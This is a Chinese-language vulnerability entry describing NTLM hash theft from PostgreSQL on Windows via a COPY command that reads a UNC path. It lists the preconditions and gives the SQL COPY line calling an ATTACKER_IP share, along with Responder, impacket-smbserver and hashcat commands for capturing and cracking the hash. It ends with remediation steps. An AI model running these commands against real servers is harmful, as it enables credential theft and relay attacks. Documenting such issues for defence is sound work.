---
id: POSTGRES-NTLM-RELAY
title: "PostgreSQL - NTLM Hash 窃取（UNC路径）"
product: postgres
vendor: PostgreSQL
version_affected: "all versions on Windows (misconfiguration)"
severity: HIGH
tags: [ntlm, hash窃取, relay, 需要认证, windows]
fingerprint: ["PostgreSQL"]
---

## 漏洞描述

当 PostgreSQL 运行在 Windows 系统上时，可以通过 COPY 命令访问 UNC 路径（`\\server\share`），这会触发 Windows SMB 认证流程，将 PostgreSQL 服务账户的 NTLM Hash 发送给攻击者控制的 SMB 服务器。攻击者可以捕获此 Hash 进行离线破解或 NTLM Relay 攻击。

## 影响版本

- 所有 Windows 版本的 PostgreSQL

## 前置条件

- 已获取数据库登录权限
- PostgreSQL 运行在 Windows 系统上
- PostgreSQL 服务器能够向攻击者发起 SMB 连接（出站 445 端口未被防火墙封禁）

## 利用步骤

```sql
-- 攻击者先在自己的机器上启动 SMB 监听
-- sudo responder -I eth0
-- 或 impacket-smbserver share /tmp -smb2support

-- 然后在 PostgreSQL 中执行，强制向攻击者发起 SMB 认证
CREATE TABLE test (id TEXT);
COPY test FROM E'\\\\ATTACKER_IP\\share\\file';
```

## Payload

```bash
# 攻击者端 - 启动 Responder 捕获 NTLM Hash
sudo responder -I eth0

# 攻击者端 - 使用 impacket-smbserver
impacket-smbserver share /tmp -smb2support

# 捕获到的 NTLMv2 Hash 可以使用 hashcat 破解
hashcat -m 5600 hash.txt wordlist.txt
```

## 修复建议

1. 限制 PostgreSQL 服务器的出站 SMB 连接（防火墙封禁出站 445 端口）
2. 使用最小权限的服务账户运行 PostgreSQL
3. 限制 COPY 命令的使用权限
4. 启用 SMB Signing 防止 NTLM Relay
5. 对服务账户使用强密码
